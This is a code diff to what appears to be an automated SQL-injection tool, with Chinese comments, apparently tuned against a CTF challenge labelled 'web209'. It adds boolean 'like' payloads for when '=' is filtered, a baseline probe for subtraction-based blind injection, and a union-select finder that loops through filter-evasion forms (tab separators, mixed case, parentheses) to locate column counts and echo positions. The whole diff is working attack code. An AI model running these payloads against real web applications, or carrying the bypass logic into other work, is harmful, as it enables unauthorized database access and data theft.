@@ -9,7 +9,7 @@ from typing import List, Optional
 
 from .models import InjectionPoint, ResponseInfo, similarity
 from .session import HttpSession
-from ..tampers import apply_form
+from ..tampers import apply_form, form_sep, mixed_case
 
 MARKER_PREFIX = "asq"          # 回显位标记前缀，尽量避开常见词
 
@@ -25,6 +25,9 @@ BOOL_FORMS = [
     ("inline",  "/**/or/**/1=1", "/**/or/**/1=2"),
     ("tab",     "\tand\t1=1", "\tand\t1=2"),
     ("tab",     "\tor\t1=1", "\tor\t1=2"),
+    # = 被剥离时 1=1→11 恒常量（web209 实测），like 型参照对兜底
+    ("paren",   "and((1)like(1))", "and((1)like(2))"),
+    ("paren",   "or((1)like(1))", "or((1)like(2))"),
     ("orinject", "oorr 1=1", "oorr 1=2"),
     ("orinject", "aornd 1=1", "aornd 1=2"),
     ("xor",     "^(1=1)", "^(1=2)"),
@@ -89,13 +92,20 @@ class Detector:
         if self.form == "arith":
             # 减法盲注：尾部用 -' 引号闭合（替代被滤的 #/--），列数/回显探测
             # 依赖 union+逗号（此形态下通常被滤）无意义，全部跳过。
-            # 基线换非数字串（数值化为 0）：'-expr-' 语义要求 0-expr-0——
-            # 数字基线 1 会让「表达式=0」页与「表不存在」页重合，存在性 oracle 失效
+            # 基线形态实测二选一（web209 实测）：数值列（id=expr 只匹配等值行）
+            # 必须保留数字基线才有两态；字符串列（username=0 即全表态）需换
+            # 非数字基线 'asq'（数值化 0）。用 'asq' 对子探测哪种语义成立。
             inj.comment = "minus-close"
-            if (inj.base_value or "").isdigit():
+            t = self._send(f"asq{inj.closure}-0-'")
+            f = self._send(f"asq{inj.closure}-1-'")
+            if self._differs(t, f):
                 inj.base_value = MARKER_PREFIX
-            self.log("INFO", "减法盲注形态：尾部用 -' 引号闭合替代注释符，"
-                             f"基线值改为 {inj.base_value!r}（数值化 0）")
+                self.log("INFO", "减法盲注形态：尾部用 -' 引号闭合替代注释符，"
+                                 "基线='asq'（字符串列语义：0=全表态）")
+            else:
+                self.log("INFO", "减法盲注形态：尾部用 -' 引号闭合替代注释符，"
+                                 f"基线保留 {inj.base_value!r}"
+                                 "（数值列语义：id=基线-expr）")
             return inj
 
         # form 升级：classic 失效（关键字剥离/空格过滤）时按多形态重找可用恒真
@@ -133,35 +143,46 @@ class Detector:
 
         对每个候选闭合/注释/列数直接发 `union select 9137,9150,...`，
         回显里出现这些独特数字即说明：闭合正确、列数正确、该列可回显。
+        空格被滤时 classic 全灭（web209 连 /**/ 都被 * 封死），故外层按
+        形态循环 classic → tab → tab+大小写混淆 → paren → …，命中即把
+        inj.form 定成对应形态，后续构造统一走同一条变换链。tab+mixed 专治
+        str_replace('select','') 类大小写敏感剥离（web209 实测正解）。
         """
         base = self.s.spec.base_value or "1"
-        for suffix in ("'", '"', "", "')", '")'):
-            for cols in (2, 3, 4, 5):
-                nums = [str(9137 + i * 13) for i in range(cols)]
-                for tail in ("#", "-- "):
-                    payload = f"{base}{suffix} union select {','.join(nums)}{tail}"
-                    r = self._send(payload)
-                    if r.status_code < 0:
-                        continue
-                    hits = [i + 1 for i, n in enumerate(nums) if n in r.body]
-                    if not hits:
-                        continue
-                    inj = InjectionPoint(param=self.s.spec.param,
-                                         base_value=base,
-                                         closure=suffix, numeric=(suffix == ""))
-                    inj.comment = tail.strip()
-                    inj.column_count = cols
-                    inj.echo_positions = hits
-                    inj.form = "classic"
-                    self.form = "classic"
-                    self.log("INFO", f"union 优先探测命中：闭合 {suffix!r}，"
-                                     f"{cols} 列，回显位 {hits}")
-                    self.s.record_step(
-                        "确认注入点（union 回显）",
-                        payload,
-                        f"and/or/报错均不可用时，union 直接确认闭合 {suffix!r}、"
-                        f"{cols} 列、回显位 {hits}")
-                    return inj
+        for mode in ("classic", "tab", "tab-mixed", "paren", "paren-mixed",
+                     "inline"):
+            base_mode = mode.split("-")[0]
+            for suffix in ("'", '"', "", "')", '")'):
+                for cols in (2, 3, 4, 5):
+                    nums = [str(9137 + i * 13) for i in range(cols)]
+                    core = apply_form(f"union select {','.join(nums)}", base_mode)
+                    if mode.endswith("-mixed"):
+                        core = mixed_case(core)
+                    sep = form_sep(base_mode) if suffix == "" else ""
+                    for tail in ("#", "-- "):
+                        payload = f"{base}{suffix}{sep}{core}{tail}"
+                        r = self._send(payload)
+                        if r.status_code < 0:
+                            continue
+                        hits = [i + 1 for i, n in enumerate(nums) if n in r.body]
+                        if not hits:
+                            continue
+                        inj = InjectionPoint(param=self.s.spec.param,
+                                             base_value=base,
+                                             closure=suffix, numeric=(suffix == ""))
+                        inj.comment = tail.strip()
+                        inj.column_count = cols
+                        inj.echo_positions = hits
+                        inj.form = base_mode
+                        self.form = base_mode
+                        self.log("INFO", f"union 优先探测命中（形态 {mode}）："
+                                         f"闭合 {suffix!r}，{cols} 列，回显位 {hits}")
+                        self.s.record_step(
+                            "确认注入点（union 回显）",
+                            payload,
+                            f"and/or/报错均不可用时，union（{mode} 形态）直接"
+                            f"确认闭合 {suffix!r}、{cols} 列、回显位 {hits}")
+                        return inj
         return None
 
     def _probe_closure(self) -> Optional[str]:
